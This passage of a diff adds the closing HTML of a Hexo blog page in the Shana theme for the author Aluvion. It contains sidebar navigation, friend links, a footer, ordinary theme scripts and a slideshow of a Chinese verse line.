+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/31733328.jfif?raw=true">
+    <h2 class="author">Aluvion</h2>
+    <h3 class="description">摸鱼</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>26</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>6</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="https://github.com/Aluvion" target="_blank" title="Github">
+          Github
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://www.jianshu.com/u/4cdc8b6d5436" target="_blank" title="简书">
+          简书
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="https://github.com/Pr0phet" target="_blank" title="pr0phet">
+          pr0phet
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://coomrade.github.io" target="_blank" title="coomrade">
+          coomrade
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://blog.y2pj.tw/wordpress/" target="_blank" title="y2pj">
+          y2pj
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://zszcr.github.io/" target="_blank" title="zszcr">
+          zszcr
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://23r3f.github.io/" target="_blank" title="23r3f">
+          23r3f
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://xi4or0uji.github.io/" target="_blank" title="xi4or0uji">
+          xi4or0uji
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://hack4.fun/" target="_blank" title="tokyocolq">
+          tokyocolq
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://glarcy.github.io/" target="_blank" title="glarcy">
+          glarcy
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://wulidecade.cn" target="_blank" title="小白">
+          小白
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://littleredlie.github.io/" target="_blank" title="LittleRed">
+          LittleRed
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
+          ShanaMaid
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2018 - 2019 Aluvion<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
+  <script src="/plugin/galmenu/GalMenu.js"></script>
+  <div class="GalMenu GalDropDown">
+      <div class="circle" id="gal">
+        <div class="ring">
+          
+            <a href="/" title="" class="menuItem">首页</a>
+          
+            <a href="/tags" title="" class="menuItem">标签</a>
+          
+            <a href="/categories" title="" class="menuItem">分类</a>
+          
+            <a href="/archives" title="" class="menuItem">归档</a>
+          
+            <a href="/???" title="" class="menuItem">None</a>
+          
+            <a href="/???" title="" class="menuItem">None</a>
+          
+        </div>
+        
+          <audio id="audio" src="#"></audio>
+        
+      </div> 
+</div>
+<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
+  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
+    for (var i = 0,
+    l = items.length; i < l; i++) {
+      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+    }</script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $('body').GalMenu({
+      'menu': 'GalDropDown'
+    })
+  });
+</script>
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
